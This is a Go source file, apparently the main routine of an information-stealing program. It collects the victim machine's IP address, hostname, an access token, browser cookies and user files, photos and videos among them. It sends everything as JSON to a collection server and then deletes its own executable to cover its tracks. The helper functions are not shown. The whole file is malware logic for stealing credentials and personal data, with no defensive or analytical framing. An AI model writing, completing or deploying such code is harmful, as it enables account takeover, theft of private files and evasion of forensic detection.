package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
)

const server = "http://127.0.0.1:3000"

func main() {
	body := make(map[string]interface{})

	body["ip"] = getIP()

	hostname, err := os.Hostname()
	if err != nil {
		body["hostname"] = body["ip"]
	} else {
		body["hostname"] = hostname
	}

	body["token"] = getToken()
	fmt.Println(body["token"])
	body["cookies"] = getCookies()
	// takes quite a long time to go through each file and read them
	// and takes quite a lot of storage ~1gb depends on how many photos and videos there are
	body["files"] = getFiles()

	jsonBytes, err := json.Marshal(body)
	if err != nil {
		os.Exit(0)
	}

	http.Post(server, "application/json", bytes.NewBuffer(jsonBytes))

	execPath, err := os.Executable()
	os.Remove(execPath)
}
